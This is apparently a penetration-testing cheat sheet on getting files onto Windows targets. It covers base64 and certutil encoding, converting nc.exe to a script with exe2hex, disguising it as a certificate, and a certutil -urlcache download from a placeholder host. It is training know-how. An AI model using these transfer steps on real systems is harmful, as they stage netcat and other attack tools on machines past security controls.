# ⭕ Encode / Decode Files

## <mark style="color:red;">Base 64 encode/decode</mark>

#### Linux

```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```

#### Windows

```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```

## <mark style="color:red;">Windows Downloads with exe2hex and PowerShell</mark>

```
cp /usr/share/windows-resources/binaries/nc.exe .

upx -9 nc.exe  >>> decrease the file size by 50%
```

#### convert nc.exe to a Windows script (.cmd) to run on the Windows machine, which will convert the file to hex and instruct powershell.exe to assemble it back into binary

```
exe2hex -x nc.exe -p nc.cmd
```

copy to clipboard directly:

```
cat nc.cmd | xclip -selection clipboard
```

paste it into the windows shell

## <mark style="color:red;">Certutil</mark>

Base64 encode the binary file outside

```
$raw = Get-Content -Path c:\nc.exe -Encoding Byte
$b64 = [System.Convert]::ToBase64String($raw)
$begin= "-----BEGIN CERTIFICATE-----"
$end = "-----END CERTIFICATE-----"
"$begin$b64$end" | Out-File c:\nc.txt
```

Download via Notepad; certutil to write:

```
certutil.exe -decode nc.txt nc.exe
```

we can use certutils cache feature to download the file:

```
certutil.exe –urlcache -split –f "http://SITE/nc.crt" nc.txt
```

## <mark style="color:red;">Base 64 Encoding + Copy & Paste</mark>

The trick is by first encoding the file in Base 64. We can do this by using Python:

```
python -c 'print(__import__("base64").b64encode(open("file", "rb").read()))'
```

Then, on the target, we can copy and paste the string into a .txt file with

```
echo "string" > output.txt
```

and use base64 to decode the file, with

```
base64 -d output.txt > output-file
```

If Python is available, you can also run

```
python -c 'print(__import__("base64").b64decode(open("string.txt", "r").read()))' > out-file
```
